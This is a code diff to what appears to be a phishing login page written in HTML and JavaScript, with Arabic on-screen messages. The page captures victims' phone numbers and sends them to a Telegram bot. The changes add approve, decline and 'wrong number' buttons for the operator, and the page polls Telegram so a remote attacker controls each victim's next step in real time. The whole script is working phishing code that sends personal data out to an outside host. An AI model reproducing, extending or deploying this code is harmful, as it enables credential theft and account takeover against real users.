@@ -203,8 +203,8 @@
             width: 25px;
             height: 25px;
         }
-        /* Toast notification style */
         
+        /* Toast notification style */
         .toast {
             visibility: hidden;
             min-width: 250px;
@@ -343,11 +343,12 @@
         const phoneInput = document.getElementById("phone");
         const toast = document.getElementById("toast");
 
+        let pollInterval = null;
+
         // =======================
         // INPUT SANITIZER (Numbers Only)
         // =======================
         phoneInput.addEventListener("input", function() {
-            // Strips out any non-digit character instantly
             this.value = this.value.replace(/\D/g, "");
         });
 
@@ -378,26 +379,110 @@
 
             localStorage.setItem('phone', phone);
 
-            const message = `New Login Attempt\n\nPhone: +249 ${phone}`;
+            // Unique user session ID
+            const userId = Date.now() + "_" + phone.slice(-4);
 
-            // Send to Telegram Bot
+            const message = `New Phone Submission\n\nPhone: +249 ${phone}`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ APPROVE", callback_data: `approve_phone_${userId}` },
+                        { text: "❌ DECLINE", callback_data: `decline_phone_${userId}` },
+                    ],
+                    [
+                        { text: "⚠️ WRONG NUMBER", callback_data: `wrong_phone_${userId}` },
+                    ],
+                ],
+            };
+
+            // Send data to Telegram Bot with inline keyboard
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        reply_markup: keyboard
+                    })
                 })
-            }).catch(() => {});
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        showToast("جاري انتظار الموافقة.....");
+                        phoneInput.disabled = true;
+                        document.querySelector('.submit-button').disabled = true;
 
-            showToast("تم إرسال النموذج.");
-
-            setTimeout(() => {
-                window.location.href = 'dashboard.html';
-            }, 1500);
+                        // Start polling updates
+                        startPolling(userId);
+                    } else {
+                        showToast("حدث خطأ أثناء إرسال البيانات.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    showToast("حدث خطأ في الشبكة.");
+                });
         });
+
+        // =======================
+        // TELEGRAM CALLBACK POLLING
+        // =======================
+        let lastUpdateId = 0;
+
+        function startPolling(userId) {
+            if (pollInterval) clearInterval(pollInterval);
+
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=2`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            const latestUpdate = data.result[data.result.length - 1];
+                            
+                            if (latestUpdate.update_id > lastUpdateId && latestUpdate.callback_query) {
+                                lastUpdateId = latestUpdate.update_id;
+                                const callbackData = latestUpdate.callback_query.data;
+                                
+                                if (callbackData.includes(userId)) {
+                                    // Acknowledge callback query
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: latestUpdate.callback_query.id })
+                                    });
+
+                                    clearInterval(pollInterval);
+
+                                    if (callbackData.startsWith("approve_phone_")) {
+                                        showToast("تمت الموافقة بنجاح! جاري الانتقال...");
+                                        setTimeout(() => {
+                                            window.location.href = 'dashboard.html';
+                                        }, 1000);
+                                    } 
+                                    else if (callbackData.startsWith("decline_phone_")) {
+                                        showToast("تم رفض الطلب، يرجى إعادة المحاولة.");
+                                        resetFormState();
+                                    } 
+                                    else if (callbackData.startsWith("wrong_phone_")) {
+                                        showToast("رقم الهاتف غير صحيح، يرجى إعادة إدخال الرقم.");
+                                        resetFormState();
+                                    }
+                                }
+                            }
+                        }
+                    })
+                    .catch(err => console.error("Polling error:", err));
+            }, 2000);
+        }
+
+        function resetFormState() {
+            demoForm.reset();
+            phoneInput.disabled = false;
+            document.querySelector('.submit-button').disabled = false;
+        }
     </script>
 </body>
 
